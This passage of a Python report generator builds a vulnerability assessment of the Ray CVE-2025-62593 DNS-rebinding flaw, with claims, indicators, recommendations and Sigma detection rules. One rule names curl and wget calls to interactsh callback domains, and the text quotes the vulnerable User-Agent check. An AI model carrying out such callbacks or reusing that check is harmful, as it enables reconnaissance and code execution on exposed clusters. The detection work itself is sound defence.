              text="RondoDox's payload sends a User-Agent starting with 'Mozilla', which the unpatched check itself "
                   "rejects, so Bitsight assesses those attempts as ineffective.",
              status=S.REPORTED, confidence=K.HIGH, evidence_refs=["e-bitsight-flaw"], source_refs=["s-bitsight"],
              observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
        Claim(claim_id="c-rondodox-infra", claim_type=C.TTP_HISTORICAL,
              text="Bitsight published 16 exploitation, 16 hosting and 4 C2 addresses used by RondoDox between "
                   "2025-05-25 and 2026-02-16.",
              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-bitsight-infra"], source_refs=["s-bitsight"],
              observed_vs_context=O.CONTEXT),
        Claim(claim_id="c-shadowray", claim_type=C.TTP_HISTORICAL,
              text="Oligo reported ShadowRay 2.0 (operator name IronErn440), active from early November 2025, "
                   "submitting jobs to internet-exposed Ray dashboards under CVE-2023-48022 for cryptomining, "
                   "propagation and credential theft.",
              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-oligo-campaign", "e-oligo-recon", "e-oligo-iocs"],
              source_refs=["s-oligo"], observed_vs_context=O.CONTEXT),
        Claim(claim_id="c-shadowray-mitre", claim_type=C.TTP_HISTORICAL,
              text="MITRE ATT&CK campaign C0045 maps ShadowRay exploitation of exposed Ray servers to T1190, with "
                   "post-exploitation including Python reverse shells, XMRig download and GPU compute hijacking.",
              status=S.REPORTED, confidence=K.HIGH, evidence_refs=["e-c0045-t1190", "e-c0045-post"],
              source_refs=["s-mitre-c0045"], observed_vs_context=O.CONTEXT),
        Claim(claim_id="c-exposed-population", claim_type=C.STATISTIC,
              text="Oligo counted more than 230,000 internet-exposed Ray servers in November 2025.",
              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-oligo-exposed"], source_refs=["s-oligo"],
              observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
        Claim(claim_id="c-credential-exposure", claim_type=C.BUSINESS_IMPACT,
              text="In ShadowRay 2.0 intrusions Oligo found database credentials, cloud credentials and tokens "
                   "taken from Ray job environment variables and configuration.",
              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-oligo-creds"], source_refs=["s-oligo"],
              observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
        Claim(claim_id="c-isolation-guidance", claim_type=C.VULNERABILITY_FACT,
              text="Ray maintainers advise that security and isolation must be enforced outside the Ray cluster, "
                   "including authorization in front of the dashboard port.",
              status=S.REPORTED, confidence=K.HIGH, evidence_refs=["e-oligo-guidance"], source_refs=["s-oligo"],
              observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
        Claim(claim_id="c-private-network", claim_type=C.VULNERABILITY_FACT,
              text="The DNS-rebinding path can reach Ray instances inside a private corporate network.",
              status=S.REPORTED, confidence=K.MEDIUM, evidence_refs=["e-thn-private"], source_refs=["s-thn"],
              observed_vs_context=O.OBSERVED, corroboration_state=SINGLE),
        Claim(claim_id="c-adoption", claim_type=C.STATISTIC,
              text="Ray had 237 million downloads and over 39,000 GitHub stars at the PyTorch Foundation's "
                   "2025-10-22 announcement.",
              status=S.CONFIRMED, confidence=K.HIGH, evidence_refs=["e-pytorch-adoption"], source_refs=["s-pytorch"],
              observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-two-paths", claim_type=C.VULNERABILITY_FACT,
              text="Two exposure paths exist: a default (loopback-bound) dashboard reached through a Firefox or "
                   "Safari user's browser by DNS rebinding, and a dashboard bound to all interfaces that any host can "
                   "reach directly.",
              status=S.ASSESSED, confidence=K.HIGH, evidence_refs=["e-ghsa-root", "e-ray-default-bind", "e-c0045-t1190"],
              source_refs=["s-ghsa", "s-ray-source", "s-mitre-c0045"], observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-patch-not-enough", claim_type=C.VULNERABILITY_FACT,
              text="Upgrading to 2.52.0 blocks browser-originated submissions only; a dashboard reachable over the "
                   "network still accepts non-browser job submissions unless token authentication or an external "
                   "control is in place.",
              status=S.ASSESSED, confidence=K.HIGH, evidence_refs=["e-fix-secfetch", "e-ray-auth-mode", "e-oligo-guidance"],
              source_refs=["s-ray-fix", "s-ray-auth", "s-oligo"], observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-mapping", claim_type=C.TTP_OBSERVED,
              text="The browser path is best mapped to T1189 Drive-by Compromise (malicious site or malvertising "
                   "reaching the victim during normal browsing); the exposed-dashboard path to T1190.",
              status=S.ASSESSED, confidence=K.MEDIUM, evidence_refs=["e-t1189-def", "e-t1190-def", "e-c0045-t1190"],
              source_refs=["s-mitre-t1189", "s-mitre-t1190", "s-mitre-c0045"], observed_vs_context=O.OBSERVED),
        Claim(claim_id="c-confirmed-compromise", claim_type=C.EXPLOITATION,
              text="Whether any exploitation of CVE-2025-62593 has succeeded is not established by any public source.",
              status=S.UNKNOWN, confidence=K.LOW, observed_vs_context=O.OBSERVED),
    ]
    for c in claims:
        g.add_claim(c)
        g.recompute_corroboration(c.claim_id)
    return g


def build_cve_record() -> CVERecord:
    return CVERecord(
        product_id=REPORT_ID, cve_id="CVE-2025-62593", cna_or_vendor="GitHub / ray-project", product="Ray (pip package)",
        affected_versions=["< 2.52.0"], fixed_versions=["2.52.0"], cwe="CWE-94, CWE-352",
        cvss_v31=8.8, cvss_v31_vector="CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:U/C:H/I:H/A:H",
        cvss_v4=9.4, cvss_v4_vector="CVSS:4.0/AV:N/AC:L/AT:N/PR:N/UI:P/VC:H/VI:H/VA:H/SC:H/SI:H/SA:H",
        epss_score=0.62459, epss_percentile=0.99165,
        kev_state=EpistemicState.CONFIRMED, kev_date="2026-08-17", kev_remediation_deadline="2026-08-20",
        root_cause="Unauthenticated job-submission API guarded only by a User-Agent prefix check that Firefox and "
                   "Safari page scripts can bypass; reached through DNS rebinding.",
        exploit_prerequisites=[
            "Ray earlier than 2.52.0 with the dashboard (default 127.0.0.1:8265) running",
            "A user on the same host browsing with Firefox or Safari visits an attacker-controlled page or ad",
            "Or: the dashboard is bound to all interfaces and reachable from the attacker (no browser needed)",
        ],
        attack_vector="NETWORK", privileges_required="NONE", user_interaction="PASSIVE (CNA v4) / REQUIRED (NVD v3.1)",
        exploit_chain_claim_ids=["c-root-cause", "c-two-paths"],
        poc_status=EpistemicState.CONFIRMED, weaponization_status=EpistemicState.REPORTED,
        confirmed_exploitation_status=EpistemicState.UNKNOWN,
        observed_exploitation_source_claim_ids=["c-ssvc", "c-rondodox-attempt", "c-rondodox-flaw"],
        patch_advisory_timeline_claim_ids=["c-affected", "c-kev"],
        mitigation_claim_ids=["c-affected", "c-token-auth"],
        compensating_control_claim_ids=["c-default-bind", "c-isolation-guidance"],
        telemetry_notes="No vendor or CISA telemetry on successful exploitation is public as of 2026-10-01.",
        detection_claim_ids=["c-fix-mechanism", "c-sec-fetch-forbidden", "c-two-paths"],
        hunting_claim_ids=["c-shadowray", "c-rondodox-infra"],
        attack_technique_ids=["T1189", "T1190"],
        reference_source_ids=["s-ghsa", "s-ray-fix", "s-nvd", "s-cisa-kev", "s-epss-now", "s-bitsight", "s-oligo"],
    )


def build_metrics_registry() -> MetricsRegistry:
    r = MetricsRegistry()
    r.register(ExternalMetric(
        metric_id="m-epss", name="EPSS score", value=0.62459, unit="probability", scope="CVE-2025-62593",
        source="FIRST.org", source_url="https://api.first.org/data/v1/epss?cve=CVE-2025-62593",
        publication_year=2026, retrieved_at=RETRIEVED, valid_until=None, review_after="2026-10-31",
        notes="Recomputed daily; this report's figure is the 2026-10-01 value.",
    ))
    r.register(ExternalMetric(
        metric_id="m-exposed", name="Internet-exposed Ray servers", value=230_000, unit="servers",
        scope="Ray dashboards reachable from the internet, November 2025", source="Oligo Security",
        source_url="https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet",
        publication_year=2025, retrieved_at=RETRIEVED, valid_until=None, review_after="2027-01-31",
        notes="Point-in-time count published by Oligo; not independently re-measured for this report.",
    ))
    r.register(ExternalMetric(
        metric_id="m-downloads", name="Ray cumulative downloads", value=237_000_000, unit="downloads",
        scope="Ray, cumulative", source="PyTorch Foundation",
        source_url="https://pytorch.org/blog/pytorch-foundation-welcomes-ray-to-deliver-a-unified-open-source-ai-compute-stack/",
        publication_year=2025, retrieved_at="2026-08-17T00:00:00Z", valid_until=None, review_after="2026-12-31",
        notes="Adoption measure, not an exposure measure.",
    ))
    return r


def build_hypothesis_sets() -> list[HypothesisSet]:
    return [
        HypothesisSet(
            question="What does CISA's 'exploitation=active' classification reflect?",
            hypotheses=(
                Hypothesis("h1", "H1: Documented attempts",
                           "The classification reflects documented exploitation attempts such as RondoDox's, "
                           "whether or not they succeeded.",
                           supporting_evidence_claim_ids=("c-ssvc", "c-rondodox-attempt"),
                           contradicting_evidence_claim_ids=(), confidence="MEDIUM"),
                Hypothesis("h2", "H2: Successful compromise seen in non-public data",
                           "CISA holds evidence of successful exploitation that it has not published.",
                           supporting_evidence_claim_ids=("c-ssvc", "c-no-cisa-detail"),
                           contradicting_evidence_claim_ids=("c-rondodox-flaw",), confidence="LOW"),
            ),
        ),
        HypothesisSet(
            question="Which exposure path carries more risk for a typical enterprise?",
            hypotheses=(
                Hypothesis("h3", "H3: Exposed dashboards",
                           "Dashboards bound to all interfaces carry more risk: they are attacked directly at scale "
                           "and the 2.52.0 browser fix does not protect them.",
                           supporting_evidence_claim_ids=("c-shadowray", "c-exposed-population", "c-patch-not-enough"),
                           contradicting_evidence_claim_ids=(), confidence="MEDIUM"),
                Hypothesis("h4", "H4: Developer workstations",
                           "Default developer installs carry more risk because they are numerous and reachable "
                           "through ordinary browsing, inside private networks.",
                           supporting_evidence_claim_ids=("c-default-bind", "c-private-network", "c-adoption"),
                           contradicting_evidence_claim_ids=("c-chrome",), confidence="LOW"),
            ),
        ),
    ]


def build_intelligence_gaps() -> list[IntelligenceGap]:
    return [
        IntelligenceGap("Whether any exploitation of CVE-2025-62593 has succeeded is not established publicly.",
                        "KNOWN_UNKNOWN", "CISA, vendor or CTI reporting of a confirmed intrusion via this CVE."),
        IntelligenceGap("What evidence led CISA to classify exploitation as active, and to change 'automatable' to "
                        "yes, is not published.", "COLLECTION_GAP", "A CISA advisory or SSVC rationale."),
        IntelligenceGap("FIRST does not publish per-CVE reasons for EPSS changes; the cause of the 2026-08-24 and "
                        "2026-09-25 increases is unknown.", "KNOWN_UNKNOWN", "EPSS model or input-feed disclosure."),
        IntelligenceGap("Whether RondoDox or another actor has corrected the User-Agent flaw is not reported.",
                        "COLLECTION_GAP", "Honeypot telemetry showing a payload without the 'Mozilla' prefix or "
                        "with Sec-Fetch headers absent."),
        IntelligenceGap("How many developer installations run with Firefox or Safari as the default browser, and "
                        "therefore meet the browser-path prerequisites, is not measured.", "KNOWN_UNKNOWN",
                        "Enterprise browser and Ray inventory data."),
    ]


def build_regulatory_applicabilities() -> list[RegulatoryApplicability]:
    return [
        RegulatoryApplicability(
            jurisdiction="US federal (FCEB)", victim_geography=None, operations_geography=None,
            data_subject_geography=None, sector=None, entity_classification=None,
            incident_facts_claim_ids=("c-kev", "c-forensic-triage"), regulation="CISA BOD 26-04",
            applicability_state=ApplicabilityState.CONFIRMED,
            basis="The CVE is in KEV with forensicTriage: Yes; BOD 26-04 binds Federal Civilian Executive Branch "
                  "agencies, which had to remediate by 2026-08-20 and perform forensic triage.",
        ),
        RegulatoryApplicability(
            jurisdiction="Global/OT-ICS", victim_geography=None, operations_geography=None,
            data_subject_geography=None, sector=None, entity_classification=None,
            incident_facts_claim_ids=("c-affected",), regulation="OT/ICS-specific frameworks",
            applicability_state=ApplicabilityState.NOT_APPLICABLE,
            basis="No source reviewed links Ray or this CVE to operational-technology deployments.",
        ),
        not_assessed(
            "Data-protection breach-notification regimes (e.g. GDPR, US state laws)",
            reason="Notification duties depend on what data a specific compromised Ray deployment processed; "
                   "ShadowRay 2.0 shows credential and data access is realistic, but no deployment-specific "
                   "incident is in scope.",
        ),
    ]


def build_forecast() -> Forecast:
    return Forecast(
        judgment="Scanning and job-submission attacks against network-reachable Ray dashboards will continue over "
                 "the next 90 days; browser-path exploitation of this CVE is possible but remains unconfirmed.",
        time_horizon="90 days from 2026-10-01",
        supporting_observation_claim_ids=("c-shadowray", "c-exposed-population", "c-epss-now", "c-ssvc"),
        historical_baseline_claim_ids=("c-shadowray", "c-rondodox-infra"),
        assumptions=("Exposed Ray dashboards remain common, as Oligo's November 2025 count indicates.",),
        counter_evidence_claim_ids=("c-rondodox-flaw", "c-confirmed-compromise"),
        alternative_scenarios=("Wide adoption of 2.52.0 plus token authentication shrinks the exposed population "
                               "and activity declines.",),
        indicators_to_watch=(
            "A CISA advisory or SSVC rationale describing the observed exploitation",
            "Honeypot reports of Ray job submissions carrying no 'Mozilla' User-Agent prefix",
            "New EPSS movement or a KEV knownRansomwareCampaignUse change",
        ),
        confidence="MEDIUM",
        confidence_rationale="Supported by the KEV and SSVC records, EPSS at the 99th percentile and documented "
                             "campaigns against exposed dashboards; limited by the absence of any public confirmed "
                             "compromise through this CVE.",
        what_would_change_assessment=("A published confirmed intrusion via the browser path would raise confidence "
                                      "in browser-path exploitation; sustained EPSS decline would lower the "
                                      "near-term judgement.",),
    )


def build_detection_rules() -> list[DetectionRule]:
    browser = (
        "title: Browser-Originated Job Submission to Ray Dashboard (CVE-2025-62593)\n"
        f"id: {_rule_uuid('ray-browser-job-submission')}\n"
        "status: experimental\n"
        "description: >\n"
        "  POST or PUT to the Ray Jobs API carrying a browser User-Agent or any Sec-Fetch-* header.\n"
        "  Ray 2.52.0 rejects exactly these requests (commit 70e7c72), so on an unpatched\n"
        "  dashboard such a request is the CVE-2025-62593 exploit path. Requires a reverse proxy\n"
        "  or sensor in front of port 8265 that logs request headers.\n"
        "references:\n"
        "  - https://github.com/ray-project/ray/security/advisories/GHSA-q279-jhrf-cc6v\n"
        "  - https://github.com/ray-project/ray/commit/70e7c72780bdec075dba6cad1afe0832772bfe09\n"
        "author: CYBERDUDEBIVASH Sentinel APEX\n"
        "date: 2026-10-01\n"
        "tags:\n"
        "  - attack.initial-access\n"
        "  - attack.t1189\n"
        "  - cve.2025-62593\n"
        "logsource:\n"
        "  category: webserver\n"
        "detection:\n"
        "  selection_endpoint:\n"
        "    cs-method:\n"
        "      - 'POST'\n"
        "      - 'PUT'\n"
        "    cs-uri-stem|contains:\n"
        "      - '/api/jobs/'\n"
        "      - '/api/job_agent/jobs/'\n"
        "  selection_browser_ua:\n"
        "    cs-user-agent|startswith: 'Mozilla'\n"
        "  selection_sec_fetch:\n"
        "    - cs-sec-fetch-mode|exists: true\n"
        "    - cs-sec-fetch-site|exists: true\n"
        "    - cs-sec-fetch-dest|exists: true\n"
        "  condition: selection_endpoint and (selection_browser_ua or selection_sec_fetch)\n"
        "falsepositives:\n"
        "  - A developer submitting a job from a browser-based tool on purpose (rare; Ray's own CLI and SDK are not browsers)\n"
        "level: high\n"
    )
    rebinding = (
        "title: Ray Jobs API Request With Non-Local Host Header (DNS Rebinding)\n"
        f"id: {_rule_uuid('ray-dns-rebinding-host')}\n"
        "status: experimental\n"
        "description: >\n"
        "  Reference logic. In a DNS-rebinding attack the browser addresses the dashboard by the\n"
        "  attacker's domain name, so the Host header carries that name while the request reaches\n"
        "  127.0.0.1:8265. Allow-list the names your users legitimately use.\n"
        "references:\n"
        "  - https://github.com/ray-project/ray/security/advisories/GHSA-q279-jhrf-cc6v\n"
        "author: CYBERDUDEBIVASH Sentinel APEX\n"
        "date: 2026-10-01\n"
        "tags:\n"
        "  - attack.initial-access\n"
        "  - attack.t1189\n"
        "  - cve.2025-62593\n"
        "logsource:\n"
        "  category: webserver\n"
        "detection:\n"
        "  selection:\n"
        "    cs-uri-stem|contains:\n"
        "      - '/api/jobs/'\n"
        "      - '/api/job_agent/jobs/'\n"
        "  filter_local_names:\n"
        "    cs-host|startswith:\n"
        "      - 'localhost'\n"
        "      - '127.0.0.1'\n"
        "      - '[::1]'\n"
        "  condition: selection and not filter_local_names\n"
        "falsepositives:\n"
        "  - Dashboards legitimately reached by an internal DNS name or through a proxy (add those names to the filter)\n"
        "level: medium\n"
    )
    exposed = (
        "title: Out-of-Band Callback via curl or wget on a Ray Node (ShadowRay Reconnaissance)\n"
        f"id: {_rule_uuid('ray-oast-entrypoint')}\n"
        "status: experimental\n"
        "description: >\n"
        "  curl or wget reaching an interactsh (oast.fun) callback domain on a Ray node: the job entrypoint\n"
        "  Oligo documented as ShadowRay 2.0 reconnaissance against network-reachable dashboards\n"
        "  (CVE-2023-48022 surface). Deploy to Ray nodes; extend with other interactsh domains you track.\n"
        "references:\n"
        "  - https://www.oligo.security/blog/shadowray-2-0-attackers-turn-ai-against-itself-in-global-campaign-that-hijacks-ai-into-self-propagating-botnet\n"
        "  - https://attack.mitre.org/campaigns/C0045/\n"
        "author: CYBERDUDEBIVASH Sentinel APEX\n"
        "date: 2026-10-01\n"
        "tags:\n"
        "  - attack.initial-access\n"
        "  - attack.t1190\n"
        "logsource:\n"
        "  category: process_creation\n"
        "  product: linux\n"
        "detection:\n"
        "  selection_tool:\n"
        "    Image|endswith:\n"
        "      - '/curl'\n"
        "      - '/wget'\n"
        "  selection_oast:\n"
        "    CommandLine|contains:\n"
        "      - '.oast.fun'\n"
        "      - 'interact.sh'\n"
        "  condition: selection_tool and selection_oast\n"
        "falsepositives:\n"
        "  - Authorized penetration tests using interactsh\n"
        "level: high\n"
    )
    return [
        DetectionRule(rule_id=_rule_uuid("ray-browser-job-submission"), technique_id="T1189", format="sigma",
                      validation_state=DetectionValidationState.SYNTAX_VALIDATED, body=browser),
        DetectionRule(rule_id=_rule_uuid("ray-dns-rebinding-host"), technique_id="T1189", format="sigma",
                      validation_state=DetectionValidationState.DRAFT, body=rebinding),
        DetectionRule(rule_id=_rule_uuid("ray-oast-entrypoint"), technique_id="T1190", format="sigma",
                      validation_state=DetectionValidationState.SYNTAX_VALIDATED, body=exposed),
    ]


def build_bibliography(graph: EvidenceGraph) -> list[BibliographyEntry]:
    from sentinel_engine.reportx.analytic_scaffolding import build_bibliography as _build
    return _build(graph)


RECOMMENDATIONS = [
    ("Priority 1", "Upgrade every Ray installation to 2.52.0 or later. Find versions with `pip show ray` or "
     "`ray --version` on developer machines, notebooks, CI images and clusters.", "c-affected"),
    ("Priority 1", "If you are bound by BOD 26-04, or suspect compromise, collect evidence before patching: volatile "
     "data first, keep a collection log, and report confirmed compromise to CISA.", "c-forensic-triage"),
    ("Priority 1", "Keep the dashboard on its default 127.0.0.1 binding. Never start Ray with "
     "`--dashboard-host 0.0.0.0` on a network you do not control; block TCP 8265 at host and network firewalls.",
     "c-default-bind"),
    ("Priority 2", "On 2.52.0 or later, enable token authentication (`RAY_AUTH_MODE=token`); it is off by default. "
     "The browser fix alone does not stop non-browser job submissions to a reachable dashboard.", "c-patch-not-enough"),
    ("Priority 2", "Where the dashboard must be reachable, put an authenticating reverse proxy in front of port 8265 "
     "and log request headers (Host, User-Agent, Sec-Fetch-*) so the detection rules in this report can run.",
     "c-isolation-guidance"),
    ("Priority 2", "If a dashboard was reachable before patching, rotate credentials and tokens available to Ray jobs "
     "(environment variables, mounted configuration, cloud roles); ShadowRay 2.0 intrusions harvested exactly these.",
     "c-credential-exposure"),
]


def _ioc_tables() -> str:
    rows = ["| Value | Type | Role | ASN / provider | Source | Observed | Confidence for blocking today |",
            "|---|---|---|---|---|---|---|"]
    for role, items in (("Exploitation", RONDODOX_EXPLOIT_IPS), ("Payload hosting", RONDODOX_HOSTING_IPS),
                        ("Command and control", RONDODOX_C2_IPS)):
        conf = "LOW (residential, likely reassigned)" if role == "Payload hosting" else "LOW (over 7 months old)"
        for ip, asn in items:
            rows.append(f"| `{ip}` | IPv4 | RondoDox {role.lower()} | {asn} | Bitsight | 2025-05-25 to 2026-02-16 | {conf} |")
    rows.append(f"| `{RONDODOX_USER_AGENT}` | User-Agent | RondoDox exploit requests | - | Bitsight | 2025-11-24 onward | MEDIUM (exact string) |")
    shadow = ["| Value | Type | Port / detail | Context | Source | Observed | Confidence for blocking today |",
              "|---|---|---|---|---|---|---|"]
    for typ, val, port, ctx in SHADOWRAY_IOCS:
        conf = "MEDIUM" if typ in ("SSH key", "Domain") else "LOW (cloud and VPS addresses rotate)"
        shadow.append(f"| `{val}` | {typ} | {port} | {ctx} | Oligo | November 2025 | {conf} |")
    return "\n".join(rows), "\n".join(shadow)


def _rendered_text(graph: EvidenceGraph, rules: list[DetectionRule]) -> str:
    rondo_table, shadow_table = _ioc_tables()
    browser_rule, rebinding_rule, exposed_rule = (r.body for r in rules)

    def source_block(sid: str) -> str:
        s = graph.sources[sid]
        lines = [f"### {sid} — {s.publisher}", "", f"- URL: {s.url}", f"- Type: {s.source_type.value}",
                 f"- Reliability: {s.reliability.value}", f"- Retrieved: {s.retrieved_at}"]
        if s.content_sha256:
            lines.append(f"- SHA-256 of retrieved content: `{s.content_sha256}`")
        else:
            lines.append(f"- SHA-256 of quoted excerpts: `{s.excerpt_fingerprint_sha256}` ({s.fingerprint_fallback_reason})")
        lines.append("")
        for e in graph.evidence.values():
            if e.source_id == sid:
                lines += [f"> {e.excerpt}", ""]
        return "\n".join(lines)

    appendix = "\n".join(source_block(sid) for sid in graph.sources)
    n_new = sum(1 for s in graph.sources.values() if s.retrieved_at == RETRIEVED)
    recs = "\n".join(f"{i}. **{p}.** {text}" for i, (p, text, _) in enumerate(RECOMMENDATIONS, 1))

    return f"""# Sentinel APEX Vulnerability Intelligence Assessment -- CVE-2025-62593 (Ray)

**CYBERDUDEBIVASH SENTINEL APEX INTEL FACTORY** · Premium Intelligence Report · Version {VERSION}

Evidence cut-off: {EVIDENCE_CUTOFF} · Detection maturity: two rules SYNTAX_VALIDATED (rule and condition parsed by pySigma 1.5.1; not lab-tested), one rule DRAFT (reference logic) -- validate in your environment before production use

**Classification:** TLP:CLEAR — public vulnerability intelligence · Supersedes the 2026-08-17 edition

## Executive Summary

**What happened.** CVE-2025-62593 lets a malicious web page run code on a machine running Ray earlier than 2.52.0, the AI and Python compute framework. The page reaches Ray's job-submission API through the victim's own Firefox or Safari browser, using DNS rebinding. CISA added it to the Known Exploited Vulnerabilities catalog on 2026-08-17 and flags it for forensic triage, not just patching. [VERIFIED FACT]

**Why it matters now.** The exploitation outlook has changed sharply since August. The EPSS score rose from 0.00369 (17 August) to **0.62459, the 99.17th percentile** (1 October). CISA's own SSVC record now rates exploitation as **automatable**. [VERIFIED FACT] No public source yet confirms a successful intrusion through this CVE. [UNKNOWN]

**Business impact.** A compromised Ray host runs attacker code with the developer's or cluster's privileges. In the related ShadowRay 2.0 campaign against exposed Ray dashboards, attackers harvested database credentials, cloud credentials and tokens from job environments. [SOURCE-REPORTED]

**Urgency.** High. Patch now, but note that the 2.52.0 fix blocks only browser-originated requests. A dashboard reachable over the network also needs token authentication or a network control. [ANALYST ASSESSMENT, high confidence]

**Confidence.** High on the vulnerability mechanics, scores and fix (vendor source code and advisory). Medium on the threat outlook (no public intrusion report).

## What Changed Since the August 2026 Edition

| Item | 2026-08-17 edition | This edition (2026-10-01) | Source |
|---|---|---|---|
| EPSS | 0.00369 (29.94th percentile), described as low | 0.62459 (99.17th percentile) | FIRST EPSS API |
| CISA SSVC "automatable" | no | yes (NVD revision 2026-08-18) | NVD |
| KEV obligations | due date only | also forensicTriage: Yes, with BOD 26-04 forensic triage steps | CISA KEV, BOD 26-04 guidance |
| Detection | one rule that excluded 127.0.0.1, so it could not see the browser path | three rules built from the fix itself (browser headers, Host mismatch, ShadowRay reconnaissance) | Ray commit 70e7c72 |
| Exposure model | developer workstation only | two paths: browser path and network-exposed dashboard | Ray 2.52.0 source, Oligo, MITRE C0045 |
| Indicators | none (deferred to the vendor) | 36 RondoDox addresses and one User-Agent string, plus 20 ShadowRay 2.0 indicators, each with source, dates and confidence | Bitsight, Oligo |

## Key Judgements

| # | Judgement | Label | Confidence |
|---|---|---|---|
| 1 | Ray earlier than 2.52.0 is exploitable through Firefox and Safari by DNS rebinding; Chrome is not, because of a Chrome bug | VERIFIED FACT | High |
| 2 | Exploitation likelihood has risen to the top 1% of all scored CVEs (EPSS 0.62459) | VERIFIED FACT | High |
| 3 | CISA classifies exploitation as active and automatable but has published no details | VERIFIED FACT / SOURCE-REPORTED | High |
| 4 | RondoDox's documented attempts used a payload that the old check itself blocks | SOURCE-REPORTED (Bitsight) | Medium |
| 5 | Patching alone does not secure a network-reachable dashboard; token authentication or a network control is required | ANALYST ASSESSMENT from vendor source code | High |
| 6 | A successful intrusion through this CVE has not been publicly confirmed | UNKNOWN | - |

## Scope and Methodology

This assessment uses {n_new} sources retrieved on 2026-10-01, plus two (PyTorch Foundation, MITRE T1190) retrieved on 2026-08-17 that remain relevant. They include:
- the vendor advisory;
- the fix commit and release source code;
- the WHATWG Fetch standard;
- NVD;
- the CISA KEV catalog and BOD 26-04 guidance;
- five FIRST EPSS API responses;
- Bitsight and Oligo research;
- MITRE ATT&CK;
- one news report.

Each source was archived at retrieval and is identified in Appendix A by the SHA-256 of its retrieved content. Two pages (the advisory and the CISA guidance) refuse automated retrieval; they are identified by the SHA-256 of the exact excerpts quoted.

Statements carry one of these labels:
- **VERIFIED FACT:** from the authoritative primary source;
- **SOURCE-REPORTED:** a single research or news source;
- **ANALYST ASSESSMENT:** our inference, with confidence;
- **UNKNOWN.**

Facts come from the archived sources. Explanations of standard mechanisms (how DNS rebinding works, what EPSS and SSVC measure) are given as background and are not presented as findings.

## Timeline

- **2025-05-25** — Bitsight's first observation of RondoDox exploitation.
- **Early November 2025** — Oligo detects ShadowRay 2.0 against exposed Ray dashboards (CVE-2023-48022).
- **2025-11-14** — Ray commit 70e7c72 ("Add denial of fetch headers") lands.
- **2025-11-24** — RondoDox attempts this CVE, two days before publication (the proof of concept was already public).
- **2025-11-26** — Advisory GHSA-q279-jhrf-cc6v published; Ray 2.52.0 released.
- **2026-03-11** — Bitsight publishes its RondoDox infrastructure research.
- **2026-08-17** — CISA adds the CVE to KEV (due 2026-08-20, forensic triage required); EPSS 0.00369.
- **2026-08-18** — NVD revision: SSVC automatable changes from no to yes; EPSS 0.01015.
- **2026-08-24** — EPSS 0.16888 (96.8th percentile).
- **2026-09-24** — EPSS 0.27290.
- **2026-09-25** — EPSS 0.62459 (99.16th percentile), unchanged through 2026-10-01.

## Vulnerability Details

Ray's dashboard serves an unauthenticated job-submission API (`/api/jobs/`, `/api/job_agent/jobs/`) on port 8265. Before 2.52.0 its only defence against browser-originated requests was `req.headers["User-Agent"].startswith("Mozilla")`. The advisory notes that Firefox and Safari let a page's `fetch` call set a different User-Agent, and that Chrome is not affected only because of a Chrome bug. [VERIFIED FACT]

By default Ray binds the dashboard to `127.0.0.1:8265` (`DEFAULT_DASHBOARD_IP = "127.0.0.1"` in the 2.52.0 source). An outside page reaches it through DNS rebinding: the attacker's domain first resolves to the attacker's server, then to 127.0.0.1. The victim's browser then sends the page's script request to the local Ray API, and the API runs the submitted job. The Hacker News notes the same technique reaches Ray instances inside private corporate networks. [VERIFIED FACT / SOURCE-REPORTED]

**The fix.** Commit 70e7c72 adds `has_sec_fetch_headers()`. The dashboard now answers HTTP 405 "Browser requests not allowed" to any POST or PUT carrying `Sec-Fetch-Mode`, `Sec-Fetch-Dest`, `Sec-Fetch-Site` or `Sec-Fetch-User`. Browsers attach these headers themselves, and the Fetch standard makes every `Sec-` header (and `Host`) a forbidden request header that page scripts cannot set. The check therefore no longer depends on the forgeable User-Agent. Ray 2.52.0 also adds token authentication, disabled by default and enabled with the `RAY_AUTH_MODE` environment variable. [VERIFIED FACT]

## Two Exposure Paths

| | Path A: browser (this CVE) | Path B: network-exposed dashboard |
|---|---|---|
| Precondition | Default install (127.0.0.1); a user on that host browses with Firefox or Safari | Dashboard started with `--dashboard-host 0.0.0.0` and reachable by the attacker |
| Attacker needs | A malicious page or ad the user loads | Only network reach; no browser, no user |
| Fixed by 2.52.0? | Yes | **No.** Non-browser submissions are still accepted unless `RAY_AUTH_MODE=token` or an external control is in place |
| Documented activity | RondoDox attempts (assessed ineffective); CISA "active" | ShadowRay 2.0 (Oligo, November 2025); MITRE campaign C0045 |
| ATT&CK | T1189 Drive-by Compromise | T1190 Exploit Public-Facing Application |

ANALYST ASSESSMENT (high confidence): Path B is the larger enterprise risk. Oligo counted more than 230,000 internet-exposed Ray servers in November 2025, and the browser fix does not protect them. Path A matters for developer fleets where Ray runs locally and users browse with Firefox or Safari.

## Severity and Exploitation Signals

| Signal | Value | What it means |
|---|---|---|
| CVSS v4 (CNA) | 9.4 Critical, user interaction Passive | Worst-case technical severity |
| CVSS v3.1 (NVD) | 8.8 High, user interaction Required | NVD scores the browser visit as required interaction |
| CISA SSVC | exploitation active; automatable yes; technical impact total | CISA's prioritisation inputs; "automatable" was "no" before 18 August |
| CISA KEV | added 2026-08-17; due 2026-08-20; forensic triage: Yes; ransomware use: Unknown | Binding for US federal civilian agencies; a strong signal for everyone else |
| EPSS | 0.62459 (99.17th percentile) on 2026-10-01 | Probability of exploitation activity in the next 30 days |

The CVSS difference is a scoring choice (Passive vs Required user interaction), not a data error. EPSS and KEV now point the same way. FIRST does not publish why a score changes, so this report does not attribute the August and September increases to any specific event.

## Exploitation Assessment

- **VERIFIED FACT:** CISA lists the CVE as known exploited, with SSVC exploitation = active.
- **SOURCE-REPORTED:** CISA has not published how it is exploited (The Hacker News).
- **SOURCE-REPORTED:** Bitsight's honeypots saw RondoDox attempts from 2025-11-24. The payload sends `Mozilla/5.0 (rondo2012@atomicmail[.]io)`, which starts with "Mozilla", so the unpatched check rejects it and Bitsight judges the attempts ineffective.
